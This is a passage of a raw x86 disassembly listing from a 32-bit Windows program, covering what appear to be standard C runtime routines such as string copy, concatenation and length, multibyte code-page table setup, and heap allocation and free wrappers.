  425616:	je     0x42561e
  425618:	test   BYTE PTR [ebp-0x8],0x1
  42561c:	jne    0x425637
  42561e:	cmp    DWORD PTR ds:0x467090,0x4
  425625:	jb     0x425631
  425627:	or     BYTE PTR [ebp+0x12],0x20
  42562b:	jmp    0x425656
  42562d:	xor    eax,eax
  42562f:	jmp    0x425666
  425631:	or     BYTE PTR [ebp+0x12],0x4
  425635:	jmp    0x425656
  425637:	mov    eax,ds:0x467334
  42563c:	test   eax,eax
  42563e:	je     0x425656
  425640:	call   eax
  425642:	mov    ebx,eax
  425644:	test   ebx,ebx
  425646:	je     0x425656
  425648:	mov    eax,ds:0x467338
  42564d:	test   eax,eax
  42564f:	je     0x425656
  425651:	push   ebx
  425652:	call   eax
  425654:	mov    ebx,eax
  425656:	push   DWORD PTR [ebp+0x10]
  425659:	push   DWORD PTR [ebp+0xc]
  42565c:	push   DWORD PTR [ebp+0x8]
  42565f:	push   ebx
  425660:	call   DWORD PTR ds:0x467330
  425666:	pop    edi
  425667:	pop    esi
  425668:	pop    ebx
  425669:	leave  
  42566a:	ret    
  42566b:	int3   
  42566c:	int3   
  42566d:	int3   
  42566e:	int3   
  42566f:	int3   
  425670:	push   edi
  425671:	mov    edi,DWORD PTR [esp+0x8]
  425675:	jmp    0x4256e5
  425677:	lea    esp,[esp+0x0]
  42567e:	mov    edi,edi
  425680:	mov    ecx,DWORD PTR [esp+0x4]
  425684:	push   edi
  425685:	test   ecx,0x3
  42568b:	je     0x4256a0
  42568d:	mov    al,BYTE PTR [ecx]
  42568f:	add    ecx,0x1
  425692:	test   al,al
  425694:	je     0x4256d3
  425696:	test   ecx,0x3
  42569c:	jne    0x42568d
  42569e:	mov    edi,edi
  4256a0:	mov    eax,DWORD PTR [ecx]
  4256a2:	mov    edx,0x7efefeff
  4256a7:	add    edx,eax
  4256a9:	xor    eax,0xffffffff
  4256ac:	xor    eax,edx
  4256ae:	add    ecx,0x4
  4256b1:	test   eax,0x81010100
  4256b6:	je     0x4256a0
  4256b8:	mov    eax,DWORD PTR [ecx-0x4]
  4256bb:	test   al,al
  4256bd:	je     0x4256e2
  4256bf:	test   ah,ah
  4256c1:	je     0x4256dd
  4256c3:	test   eax,0xff0000
  4256c8:	je     0x4256d8
  4256ca:	test   eax,0xff000000
  4256cf:	je     0x4256d3
  4256d1:	jmp    0x4256a0
  4256d3:	lea    edi,[ecx-0x1]
  4256d6:	jmp    0x4256e5
  4256d8:	lea    edi,[ecx-0x2]
  4256db:	jmp    0x4256e5
  4256dd:	lea    edi,[ecx-0x3]
  4256e0:	jmp    0x4256e5
  4256e2:	lea    edi,[ecx-0x4]
  4256e5:	mov    ecx,DWORD PTR [esp+0xc]
  4256e9:	test   ecx,0x3
  4256ef:	je     0x42570e
  4256f1:	mov    dl,BYTE PTR [ecx]
  4256f3:	add    ecx,0x1
  4256f6:	test   dl,dl
  4256f8:	je     0x425760
  4256fa:	mov    BYTE PTR [edi],dl
  4256fc:	add    edi,0x1
  4256ff:	test   ecx,0x3
  425705:	jne    0x4256f1
  425707:	jmp    0x42570e
  425709:	mov    DWORD PTR [edi],edx
  42570b:	add    edi,0x4
  42570e:	mov    edx,0x7efefeff
  425713:	mov    eax,DWORD PTR [ecx]
  425715:	add    edx,eax
  425717:	xor    eax,0xffffffff
  42571a:	xor    eax,edx
  42571c:	mov    edx,DWORD PTR [ecx]
  42571e:	add    ecx,0x4
  425721:	test   eax,0x81010100
  425726:	je     0x425709
  425728:	test   dl,dl
  42572a:	je     0x425760
  42572c:	test   dh,dh
  42572e:	je     0x425757
  425730:	test   edx,0xff0000
  425736:	je     0x42574a
  425738:	test   edx,0xff000000
  42573e:	je     0x425742
  425740:	jmp    0x425709
  425742:	mov    DWORD PTR [edi],edx
  425744:	mov    eax,DWORD PTR [esp+0x8]
  425748:	pop    edi
  425749:	ret    
  42574a:	mov    WORD PTR [edi],dx
  42574d:	mov    eax,DWORD PTR [esp+0x8]
  425751:	mov    BYTE PTR [edi+0x2],0x0
  425755:	pop    edi
  425756:	ret    
  425757:	mov    WORD PTR [edi],dx
  42575a:	mov    eax,DWORD PTR [esp+0x8]
  42575e:	pop    edi
  42575f:	ret    
  425760:	mov    BYTE PTR [edi],dl
  425762:	mov    eax,DWORD PTR [esp+0x8]
  425766:	pop    edi
  425767:	ret    
  425768:	int3   
  425769:	int3   
  42576a:	int3   
  42576b:	int3   
  42576c:	int3   
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	mov    ecx,DWORD PTR [esp+0xc]
  425774:	push   edi
  425775:	test   ecx,ecx
  425777:	je     0x42580f
  42577d:	push   esi
  42577e:	push   ebx
  42577f:	mov    ebx,ecx
  425781:	mov    esi,DWORD PTR [esp+0x14]
  425785:	test   esi,0x3
  42578b:	mov    edi,DWORD PTR [esp+0x10]
  42578f:	jne    0x42579c
  425791:	shr    ecx,0x2
  425794:	jne    0x42581f
  42579a:	jmp    0x4257c3
  42579c:	mov    al,BYTE PTR [esi]
  42579e:	add    esi,0x1
  4257a1:	mov    BYTE PTR [edi],al
  4257a3:	add    edi,0x1
  4257a6:	sub    ecx,0x1
  4257a9:	je     0x4257d6
  4257ab:	test   al,al
  4257ad:	je     0x4257de
  4257af:	test   esi,0x3
  4257b5:	jne    0x42579c
  4257b7:	mov    ebx,ecx
  4257b9:	shr    ecx,0x2
  4257bc:	jne    0x42581f
  4257be:	and    ebx,0x3
  4257c1:	je     0x4257d6
  4257c3:	mov    al,BYTE PTR [esi]
  4257c5:	add    esi,0x1
  4257c8:	mov    BYTE PTR [edi],al
  4257ca:	add    edi,0x1
  4257cd:	test   al,al
  4257cf:	je     0x425808
  4257d1:	sub    ebx,0x1
  4257d4:	jne    0x4257c3
  4257d6:	mov    eax,DWORD PTR [esp+0x10]
  4257da:	pop    ebx
  4257db:	pop    esi
  4257dc:	pop    edi
  4257dd:	ret    
  4257de:	test   edi,0x3
  4257e4:	je     0x4257fc
  4257e6:	mov    BYTE PTR [edi],al
  4257e8:	add    edi,0x1
  4257eb:	sub    ecx,0x1
  4257ee:	je     0x42588c
  4257f4:	test   edi,0x3
  4257fa:	jne    0x4257e6
  4257fc:	mov    ebx,ecx
  4257fe:	shr    ecx,0x2
  425801:	jne    0x425877
  425803:	mov    BYTE PTR [edi],al
  425805:	add    edi,0x1
  425808:	sub    ebx,0x1
  42580b:	jne    0x425803
  42580d:	pop    ebx
  42580e:	pop    esi
  42580f:	mov    eax,DWORD PTR [esp+0x8]
  425813:	pop    edi
  425814:	ret    
  425815:	mov    DWORD PTR [edi],edx
  425817:	add    edi,0x4
  42581a:	sub    ecx,0x1
  42581d:	je     0x4257be
  42581f:	mov    edx,0x7efefeff
  425824:	mov    eax,DWORD PTR [esi]
  425826:	add    edx,eax
  425828:	xor    eax,0xffffffff
  42582b:	xor    eax,edx
  42582d:	mov    edx,DWORD PTR [esi]
  42582f:	add    esi,0x4
  425832:	test   eax,0x81010100
  425837:	je     0x425815
  425839:	test   dl,dl
  42583b:	je     0x425869
  42583d:	test   dh,dh
  42583f:	je     0x42585f
  425841:	test   edx,0xff0000
  425847:	je     0x425855
  425849:	test   edx,0xff000000
  42584f:	jne    0x425815
  425851:	mov    DWORD PTR [edi],edx
  425853:	jmp    0x42586d
  425855:	and    edx,0xffff
  42585b:	mov    DWORD PTR [edi],edx
  42585d:	jmp    0x42586d
  42585f:	and    edx,0xff
  425865:	mov    DWORD PTR [edi],edx
  425867:	jmp    0x42586d
  425869:	xor    edx,edx
  42586b:	mov    DWORD PTR [edi],edx
  42586d:	add    edi,0x4
  425870:	xor    eax,eax
  425872:	sub    ecx,0x1
  425875:	je     0x425883
  425877:	xor    eax,eax
  425879:	mov    DWORD PTR [edi],eax
  42587b:	add    edi,0x4
  42587e:	sub    ecx,0x1
  425881:	jne    0x425879
  425883:	and    ebx,0x3
  425886:	jne    0x425803
  42588c:	mov    eax,DWORD PTR [esp+0x10]
  425890:	pop    ebx
  425891:	pop    esi
  425892:	pop    edi
  425893:	ret    
  425894:	int3   
  425895:	int3   
  425896:	int3   
  425897:	int3   
  425898:	int3   
  425899:	int3   
  42589a:	int3   
  42589b:	int3   
  42589c:	int3   
  42589d:	int3   
  42589e:	int3   
  42589f:	int3   
  4258a0:	mov    ecx,DWORD PTR [esp+0x4]
  4258a4:	test   ecx,0x3
  4258aa:	je     0x4258d0
  4258ac:	mov    al,BYTE PTR [ecx]
  4258ae:	add    ecx,0x1
  4258b1:	test   al,al
  4258b3:	je     0x425903
  4258b5:	test   ecx,0x3
  4258bb:	jne    0x4258ac
  4258bd:	add    eax,0x0
  4258c2:	lea    esp,[esp+0x0]
  4258c9:	lea    esp,[esp+0x0]
  4258d0:	mov    eax,DWORD PTR [ecx]
  4258d2:	mov    edx,0x7efefeff
  4258d7:	add    edx,eax
  4258d9:	xor    eax,0xffffffff
  4258dc:	xor    eax,edx
  4258de:	add    ecx,0x4
  4258e1:	test   eax,0x81010100
  4258e6:	je     0x4258d0
  4258e8:	mov    eax,DWORD PTR [ecx-0x4]
  4258eb:	test   al,al
  4258ed:	je     0x425921
  4258ef:	test   ah,ah
  4258f1:	je     0x425917
  4258f3:	test   eax,0xff0000
  4258f8:	je     0x42590d
  4258fa:	test   eax,0xff000000
  4258ff:	je     0x425903
  425901:	jmp    0x4258d0
  425903:	lea    eax,[ecx-0x1]
  425906:	mov    ecx,DWORD PTR [esp+0x4]
  42590a:	sub    eax,ecx
  42590c:	ret    
  42590d:	lea    eax,[ecx-0x2]
  425910:	mov    ecx,DWORD PTR [esp+0x4]
  425914:	sub    eax,ecx
  425916:	ret    
  425917:	lea    eax,[ecx-0x3]
  42591a:	mov    ecx,DWORD PTR [esp+0x4]
  42591e:	sub    eax,ecx
  425920:	ret    
  425921:	lea    eax,[ecx-0x4]
  425924:	mov    ecx,DWORD PTR [esp+0x4]
  425928:	sub    eax,ecx
  42592a:	ret    
  42592b:	push   0x8
  42592d:	push   0x4295a0
  425932:	call   0x425290
  425937:	and    DWORD PTR [ebp-0x4],0x0
  42593b:	push   0x0
  42593d:	push   0x1
  42593f:	call   0x4274b2
  425944:	pop    ecx
  425945:	pop    ecx
  425946:	jmp    0x42594f
  425948:	xor    eax,eax
  42594a:	inc    eax
  42594b:	ret    
  42594c:	mov    esp,DWORD PTR [ebp-0x18]
  42594f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425953:	push   0x3
  425955:	call   DWORD PTR ds:0x429070
  42595b:	int3   
  42595c:	cmp    ecx,DWORD PTR ds:0x4669f0
  425962:	jne    0x425965
  425964:	ret    
  425965:	jmp    0x42592b
  42596a:	movzx  eax,BYTE PTR [esp+0x4]
  42596f:	mov    cl,BYTE PTR [esp+0xc]
  425973:	test   BYTE PTR [eax+0x4674e1],cl
  425979:	jne    0x425997
  42597b:	cmp    DWORD PTR [esp+0x8],0x0
  425980:	je     0x425990
  425982:	movzx  eax,WORD PTR [eax*2+0x42999a]
  42598a:	and    eax,DWORD PTR [esp+0x8]
  42598e:	jmp    0x425992
  425990:	xor    eax,eax
  425992:	test   eax,eax
  425994:	jne    0x425997
  425996:	ret    
  425997:	xor    eax,eax
  425999:	inc    eax
  42599a:	ret    
  42599b:	push   0x4
  42599d:	push   0x0
  42599f:	push   DWORD PTR [esp+0xc]
  4259a3:	call   0x42596a
  4259a8:	add    esp,0xc
  4259ab:	ret    
  4259ac:	sub    eax,0x3a4
  4259b1:	je     0x4259d5
  4259b3:	sub    eax,0x4
  4259b6:	je     0x4259cf
  4259b8:	sub    eax,0xd
  4259bb:	je     0x4259c9
  4259bd:	dec    eax
  4259be:	je     0x4259c3
  4259c0:	xor    eax,eax
  4259c2:	ret    
  4259c3:	mov    eax,0x404
  4259c8:	ret    
  4259c9:	mov    eax,0x412
  4259ce:	ret    
  4259cf:	mov    eax,0x804
  4259d4:	ret    
  4259d5:	mov    eax,0x411
  4259da:	ret    
  4259db:	push   edi
  4259dc:	push   0x40
  4259de:	xor    eax,eax
  4259e0:	pop    ecx
  4259e1:	mov    edi,0x4674e0
  4259e6:	rep stos DWORD PTR es:[edi],eax
  4259e8:	stos   BYTE PTR es:[edi],al
  4259e9:	xor    eax,eax
  4259eb:	mov    ds:0x4675e4,eax
  4259f0:	mov    ds:0x4674dc,eax
  4259f5:	mov    ds:0x4674d4,eax
  4259fa:	mov    edi,0x4675f0
  4259ff:	stos   DWORD PTR es:[edi],eax
  425a00:	stos   DWORD PTR es:[edi],eax
  425a01:	stos   DWORD PTR es:[edi],eax
  425a02:	pop    edi
  425a03:	ret    
  425a04:	push   ebp
  425a05:	mov    ebp,esp
  425a07:	sub    esp,0x518
  425a0d:	mov    eax,ds:0x4669f0
  425a12:	xor    eax,DWORD PTR [ebp+0x4]
  425a15:	push   esi
  425a16:	mov    DWORD PTR [ebp-0x4],eax
  425a19:	lea    eax,[ebp-0x18]
  425a1c:	push   eax
  425a1d:	push   DWORD PTR ds:0x4675e4
  425a23:	call   DWORD PTR ds:0x4290d8
  425a29:	cmp    eax,0x1
  425a2c:	mov    esi,0x100
  425a31:	jne    0x425b44
  425a37:	xor    eax,eax
  425a39:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425a40:	inc    eax
  425a41:	cmp    eax,esi
  425a43:	jb     0x425a39
  425a45:	mov    al,BYTE PTR [ebp-0x12]
  425a48:	test   al,al
  425a4a:	mov    BYTE PTR [ebp-0x118],0x20
  425a51:	je     0x425a89
  425a53:	push   ebx
  425a54:	lea    edx,[ebp-0x11]
  425a57:	push   edi
  425a58:	movzx  ecx,BYTE PTR [edx]
  425a5b:	movzx  eax,al
  425a5e:	cmp    eax,ecx
  425a60:	ja     0x425a7f
  425a62:	sub    ecx,eax
  425a64:	inc    ecx
  425a65:	mov    ebx,ecx
  425a67:	shr    ecx,0x2
  425a6a:	lea    edi,[ebp+eax*1-0x118]
  425a71:	mov    eax,0x20202020
  425a76:	rep stos DWORD PTR es:[edi],eax
  425a78:	mov    ecx,ebx
  425a7a:	and    ecx,0x3
  425a7d:	rep stos BYTE PTR es:[edi],al
  425a7f:	inc    edx
  425a80:	mov    al,BYTE PTR [edx]
  425a82:	inc    edx
  425a83:	test   al,al
  425a85:	jne    0x425a58
  425a87:	pop    edi
  425a88:	pop    ebx
  425a89:	push   0x0
  425a8b:	push   DWORD PTR ds:0x4674d4
  425a91:	lea    eax,[ebp-0x518]
  425a97:	push   DWORD PTR ds:0x4675e4
  425a9d:	push   eax
  425a9e:	push   esi
  425a9f:	lea    eax,[ebp-0x118]
  425aa5:	push   eax
  425aa6:	push   0x1
  425aa8:	call   0x4279b8
  425aad:	push   0x0
  425aaf:	push   DWORD PTR ds:0x4675e4
  425ab5:	lea    eax,[ebp-0x218]
  425abb:	push   esi
  425abc:	push   eax
  425abd:	push   esi
  425abe:	lea    eax,[ebp-0x118]
  425ac4:	push   eax
  425ac5:	push   esi
  425ac6:	push   DWORD PTR ds:0x4674d4
  425acc:	call   0x4275fc
  425ad1:	push   0x0
  425ad3:	push   DWORD PTR ds:0x4675e4
  425ad9:	lea    eax,[ebp-0x318]
  425adf:	push   esi
  425ae0:	push   eax
  425ae1:	push   esi
  425ae2:	lea    eax,[ebp-0x118]
  425ae8:	push   eax
  425ae9:	push   0x200
  425aee:	push   DWORD PTR ds:0x4674d4
  425af4:	call   0x4275fc
  425af9:	add    esp,0x5c
  425afc:	xor    eax,eax
  425afe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425b06:	test   cl,0x1
  425b09:	je     0x425b21
  425b0b:	or     BYTE PTR [eax+0x4674e1],0x10
  425b12:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425b19:	mov    BYTE PTR [eax+0x467600],cl
  425b1f:	jmp    0x425b3d
  425b21:	test   cl,0x2
  425b24:	je     0x425b36
  425b26:	or     BYTE PTR [eax+0x4674e1],0x20
  425b2d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425b34:	jmp    0x425b19
  425b36:	and    BYTE PTR [eax+0x467600],0x0
  425b3d:	inc    eax
  425b3e:	cmp    eax,esi
  425b40:	jb     0x425afe
  425b42:	jmp    0x425b88
  425b44:	xor    eax,eax
  425b46:	cmp    eax,0x41
  425b49:	jb     0x425b64
  425b4b:	cmp    eax,0x5a
  425b4e:	ja     0x425b64
  425b50:	or     BYTE PTR [eax+0x4674e1],0x10
  425b57:	mov    cl,al
  425b59:	add    cl,0x20
  425b5c:	mov    BYTE PTR [eax+0x467600],cl
  425b62:	jmp    0x425b83
  425b64:	cmp    eax,0x61
  425b67:	jb     0x425b7c
  425b69:	cmp    eax,0x7a
  425b6c:	ja     0x425b7c
  425b6e:	or     BYTE PTR [eax+0x4674e1],0x20
  425b75:	mov    cl,al
  425b77:	sub    cl,0x20
  425b7a:	jmp    0x425b5c
  425b7c:	and    BYTE PTR [eax+0x467600],0x0
  425b83:	inc    eax
  425b84:	cmp    eax,esi
  425b86:	jb     0x425b46
  425b88:	mov    ecx,DWORD PTR [ebp-0x4]
  425b8b:	xor    ecx,DWORD PTR [ebp+0x4]
  425b8e:	pop    esi
  425b8f:	call   0x42595c
  425b94:	leave  
  425b95:	ret    
  425b96:	push   ebp
  425b97:	mov    ebp,esp
  425b99:	sub    esp,0x1c
  425b9c:	mov    eax,ds:0x4669f0
  425ba1:	xor    eax,DWORD PTR [ebp+0x4]
  425ba4:	push   ebx
  425ba5:	push   esi
  425ba6:	mov    esi,DWORD PTR [ebp+0x8]
  425ba9:	xor    ebx,ebx
  425bab:	cmp    esi,ebx
  425bad:	mov    DWORD PTR [ebp-0x4],eax
  425bb0:	push   edi
  425bb1:	je     0x425d0b
  425bb7:	xor    edx,edx
  425bb9:	xor    eax,eax
  425bbb:	cmp    DWORD PTR [eax+0x466a00],esi
  425bc1:	je     0x425c28
  425bc3:	add    eax,0x30
  425bc6:	inc    edx
  425bc7:	cmp    eax,0xf0
  425bcc:	jb     0x425bbb
  425bce:	lea    eax,[ebp-0x1c]
  425bd1:	push   eax
  425bd2:	push   esi
  425bd3:	call   DWORD PTR ds:0x4290d8
  425bd9:	cmp    eax,0x1
  425bdc:	jne    0x425d03
  425be2:	push   0x40
  425be4:	xor    eax,eax
  425be6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425bea:	pop    ecx
  425beb:	mov    edi,0x4674e0
  425bf0:	rep stos DWORD PTR es:[edi],eax
  425bf2:	stos   BYTE PTR es:[edi],al
  425bf3:	mov    DWORD PTR ds:0x4675e4,esi
  425bf9:	mov    DWORD PTR ds:0x4674d4,ebx
  425bff:	jbe    0x425cf1
  425c05:	cmp    BYTE PTR [ebp-0x16],0x0
  425c09:	je     0x425cc9
  425c0f:	lea    ecx,[ebp-0x15]
  425c12:	mov    dl,BYTE PTR [ecx]
  425c14:	test   dl,dl
  425c16:	je     0x425cc9
  425c1c:	movzx  eax,BYTE PTR [ecx-0x1]
  425c20:	movzx  edx,dl
  425c23:	jmp    0x425cb9
  425c28:	push   0x40
  425c2a:	xor    eax,eax
  425c2c:	pop    ecx
  425c2d:	mov    edi,0x4674e0
  425c32:	rep stos DWORD PTR es:[edi],eax
  425c34:	lea    ecx,[edx+edx*2]
  425c37:	shl    ecx,0x4
  425c3a:	mov    DWORD PTR [ebp-0x8],ebx
  425c3d:	stos   BYTE PTR es:[edi],al
  425c3e:	lea    ebx,[ecx+0x466a10]
  425c44:	mov    al,BYTE PTR [ebx]
  425c46:	mov    esi,ebx
  425c48:	jmp    0x425c73
  425c4a:	mov    dl,BYTE PTR [esi+0x1]
  425c4d:	test   dl,dl
  425c4f:	je     0x425c77
  425c51:	movzx  eax,al
  425c54:	movzx  edi,dl
  425c57:	cmp    eax,edi
  425c59:	ja     0x425c6f
  425c5b:	mov    edx,DWORD PTR [ebp-0x8]
  425c5e:	mov    dl,BYTE PTR [edx+0x4669f8]
  425c64:	or     BYTE PTR [eax+0x4674e1],dl
  425c6a:	inc    eax
  425c6b:	cmp    eax,edi
  425c6d:	jbe    0x425c64
  425c6f:	inc    esi
  425c70:	inc    esi
  425c71:	mov    al,BYTE PTR [esi]
  425c73:	test   al,al
  425c75:	jne    0x425c4a
  425c77:	inc    DWORD PTR [ebp-0x8]
  425c7a:	add    ebx,0x8
  425c7d:	cmp    DWORD PTR [ebp-0x8],0x4
  425c81:	jb     0x425c44
  425c83:	mov    eax,DWORD PTR [ebp+0x8]
  425c86:	mov    ds:0x4675e4,eax
  425c8b:	mov    DWORD PTR ds:0x4674dc,0x1
  425c95:	call   0x4259ac
  425c9a:	lea    ecx,[ecx+0x466a04]
  425ca0:	mov    esi,ecx
  425ca2:	mov    edi,0x4675f0
  425ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca9:	mov    ds:0x4674d4,eax
  425cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425caf:	jmp    0x425d10
  425cb1:	or     BYTE PTR [eax+0x4674e1],0x4
  425cb8:	inc    eax
  425cb9:	cmp    eax,edx
  425cbb:	jbe    0x425cb1
  425cbd:	inc    ecx
  425cbe:	inc    ecx
  425cbf:	cmp    BYTE PTR [ecx-0x1],0x0
  425cc3:	jne    0x425c12
  425cc9:	xor    ecx,ecx
  425ccb:	inc    ecx
  425ccc:	mov    eax,ecx
  425cce:	or     BYTE PTR [eax+0x4674e1],0x8
  425cd5:	inc    eax
  425cd6:	cmp    eax,0xff
  425cdb:	jb     0x425cce
  425cdd:	mov    eax,esi
  425cdf:	call   0x4259ac
  425ce4:	mov    ds:0x4674d4,eax
  425ce9:	mov    DWORD PTR ds:0x4674dc,ecx
  425cef:	jmp    0x425cf7
  425cf1:	mov    DWORD PTR ds:0x4674dc,ebx
  425cf7:	xor    eax,eax
  425cf9:	mov    edi,0x4675f0
  425cfe:	stos   DWORD PTR es:[edi],eax
  425cff:	stos   DWORD PTR es:[edi],eax
  425d00:	stos   DWORD PTR es:[edi],eax
  425d01:	jmp    0x425d10
  425d03:	cmp    DWORD PTR ds:0x467344,ebx
  425d09:	je     0x425d19
  425d0b:	call   0x4259db
  425d10:	call   0x425a04
  425d15:	xor    eax,eax
  425d17:	jmp    0x425d1c
  425d19:	or     eax,0xffffffff
  425d1c:	mov    ecx,DWORD PTR [ebp-0x4]
  425d1f:	xor    ecx,DWORD PTR [ebp+0x4]
  425d22:	pop    edi
  425d23:	pop    esi
  425d24:	pop    ebx
  425d25:	call   0x42595c
  425d2a:	leave  
  425d2b:	ret    
  425d2c:	push   0x14
  425d2e:	push   0x4295b0
  425d33:	call   0x425290
  425d38:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425d3c:	push   0xd
  425d3e:	call   0x42544f
  425d43:	pop    ecx
  425d44:	xor    edi,edi
  425d46:	mov    DWORD PTR [ebp-0x4],edi
  425d49:	mov    DWORD PTR ds:0x467344,edi
  425d4f:	mov    eax,DWORD PTR [ebp+0x8]
  425d52:	cmp    eax,0xfffffffe
  425d55:	jne    0x425d69
  425d57:	mov    DWORD PTR ds:0x467344,0x1
  425d61:	call   DWORD PTR ds:0x4290d4
  425d67:	jmp    0x425d94
  425d69:	cmp    eax,0xfffffffd
  425d6c:	jne    0x425d80
  425d6e:	mov    DWORD PTR ds:0x467344,0x1
  425d78:	call   DWORD PTR ds:0x4290d0
  425d7e:	jmp    0x425d94
  425d80:	cmp    eax,0xfffffffc
  425d83:	jne    0x425d94
  425d85:	mov    DWORD PTR ds:0x467344,0x1
  425d8f:	mov    eax,ds:0x467374
  425d94:	mov    DWORD PTR [ebp+0x8],eax
  425d97:	cmp    eax,DWORD PTR ds:0x4675e4
  425d9d:	je     0x425e5e
  425da3:	mov    esi,DWORD PTR ds:0x4674d8
  425da9:	mov    DWORD PTR [ebp-0x20],esi
  425dac:	cmp    esi,edi
  425dae:	je     0x425db4
  425db0:	cmp    DWORD PTR [esi],edi
  425db2:	je     0x425dc4
  425db4:	push   0x220
  425db9:	call   0x425fb2
  425dbe:	pop    ecx
  425dbf:	mov    esi,eax
  425dc1:	mov    DWORD PTR [ebp-0x20],esi
  425dc4:	cmp    esi,edi
  425dc6:	je     0x425e47
  425dc8:	push   DWORD PTR [ebp+0x8]
  425dcb:	call   0x425b96
  425dd0:	pop    ecx
  425dd1:	mov    DWORD PTR [ebp-0x1c],eax
  425dd4:	cmp    eax,edi
  425dd6:	jne    0x425e47
  425dd8:	mov    DWORD PTR [esi],edi
  425dda:	mov    eax,ds:0x4675e4
  425ddf:	mov    DWORD PTR [esi+0x4],eax
  425de2:	mov    eax,ds:0x4674dc
  425de7:	mov    DWORD PTR [esi+0x8],eax
  425dea:	mov    eax,ds:0x4674d4
  425def:	mov    DWORD PTR [esi+0xc],eax
  425df2:	xor    eax,eax
  425df4:	mov    DWORD PTR [ebp-0x24],eax
  425df7:	cmp    eax,0x5
  425dfa:	jge    0x425e0c
  425dfc:	mov    cx,WORD PTR [eax*2+0x4675f0]
  425e04:	mov    WORD PTR [esi+eax*2+0x10],cx
  425e09:	inc    eax
  425e0a:	jmp    0x425df4
  425e0c:	xor    eax,eax
  425e0e:	mov    DWORD PTR [ebp-0x24],eax
  425e11:	cmp    eax,0x101
  425e16:	jge    0x425e25
  425e18:	mov    cl,BYTE PTR [eax+0x4674e0]
  425e1e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425e22:	inc    eax
  425e23:	jmp    0x425e0e
  425e25:	xor    eax,eax
  425e27:	mov    DWORD PTR [ebp-0x24],eax
  425e2a:	cmp    eax,0x100
  425e2f:	jge    0x425e41
  425e31:	mov    cl,BYTE PTR [eax+0x467600]
  425e37:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425e3e:	inc    eax
  425e3f:	jmp    0x425e27
  425e41:	mov    DWORD PTR ds:0x4674d8,esi
  425e47:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425e4b:	jne    0x425e61
  425e4d:	cmp    esi,DWORD PTR ds:0x4674d8
  425e53:	je     0x425e61
  425e55:	push   esi
  425e56:	call   0x425e9a
  425e5b:	pop    ecx
  425e5c:	jmp    0x425e61
  425e5e:	mov    DWORD PTR [ebp-0x1c],edi
  425e61:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e65:	call   0x425e73
  425e6a:	mov    eax,DWORD PTR [ebp-0x1c]
  425e6d:	call   0x4252cb
  425e72:	ret    
  425e73:	push   0xd
  425e75:	call   0x4253bb
  425e7a:	pop    ecx
  425e7b:	ret    
  425e7c:	cmp    DWORD PTR ds:0x46782c,0x0
  425e83:	jne    0x425e97
  425e85:	push   0xfffffffd
  425e87:	call   0x425d2c
  425e8c:	pop    ecx
  425e8d:	mov    DWORD PTR ds:0x46782c,0x1
  425e97:	xor    eax,eax
  425e99:	ret    
  425e9a:	push   0xc
  425e9c:	push   0x4295c0
  425ea1:	call   0x425290
  425ea6:	mov    esi,DWORD PTR [ebp+0x8]
  425ea9:	test   esi,esi
  425eab:	je     0x425f05
  425ead:	cmp    DWORD PTR ds:0x467704,0x3
  425eb4:	jne    0x425ef6
  425eb6:	push   0x4
  425eb8:	call   0x42544f
  425ebd:	pop    ecx
  425ebe:	and    DWORD PTR [ebp-0x4],0x0
  425ec2:	push   esi
  425ec3:	call   0x426672
  425ec8:	pop    ecx
  425ec9:	mov    DWORD PTR [ebp-0x1c],eax
  425ecc:	test   eax,eax
  425ece:	je     0x425ed9
  425ed0:	push   esi
  425ed1:	push   eax
  425ed2:	call   0x42669d
  425ed7:	pop    ecx
  425ed8:	pop    ecx
  425ed9:	or     DWORD PTR [ebp-0x4],0xffffffff
  425edd:	call   0x425eed
  425ee2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ee6:	jne    0x425f05
  425ee8:	push   DWORD PTR [ebp+0x8]
  425eeb:	jmp    0x425ef7
  425eed:	push   0x4
  425eef:	call   0x4253bb
  425ef4:	pop    ecx
  425ef5:	ret    
  425ef6:	push   esi
  425ef7:	push   0x0
  425ef9:	push   DWORD PTR ds:0x467700
  425eff:	call   DWORD PTR ds:0x429058
  425f05:	call   0x4252cb
  425f0a:	ret    
  425f0b:	push   0xc
  425f0d:	push   0x4295d0
  425f12:	call   0x425290
  425f17:	mov    esi,DWORD PTR [ebp+0x8]
  425f1a:	cmp    DWORD PTR ds:0x467704,0x3
  425f21:	jne    0x425f51
  425f23:	cmp    esi,DWORD PTR ds:0x4674c4
  425f29:	ja     0x425f51
  425f2b:	push   0x4
  425f2d:	call   0x42544f
  425f32:	pop    ecx
  425f33:	and    DWORD PTR [ebp-0x4],0x0
  425f37:	push   esi
  425f38:	call   0x426e51
  425f3d:	pop    ecx
  425f3e:	mov    DWORD PTR [ebp-0x1c],eax
  425f41:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f45:	call   0x425f7d
  425f4a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f4d:	test   eax,eax
  425f4f:	jne    0x425f74
  425f51:	test   esi,esi
  425f53:	jne    0x425f56
  425f55:	inc    esi
  425f56:	cmp    DWORD PTR ds:0x467704,0x1
  425f5d:	je     0x425f65
  425f5f:	add    esi,0xf
  425f62:	and    esi,0xfffffff0
  425f65:	push   esi
  425f66:	push   0x0
  425f68:	push   DWORD PTR ds:0x467700
  425f6e:	call   DWORD PTR ds:0x4290dc
  425f74:	call   0x4252cb
  425f79:	ret    
  425f7a:	mov    esi,DWORD PTR [ebp+0x8]
  425f7d:	push   0x4
  425f7f:	call   0x4253bb
  425f84:	pop    ecx
  425f85:	ret    
  425f86:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  425f8b:	ja     0x425faf
  425f8d:	push   DWORD PTR [esp+0x4]
  425f91:	call   0x425f0b
  425f96:	test   eax,eax
  425f98:	pop    ecx
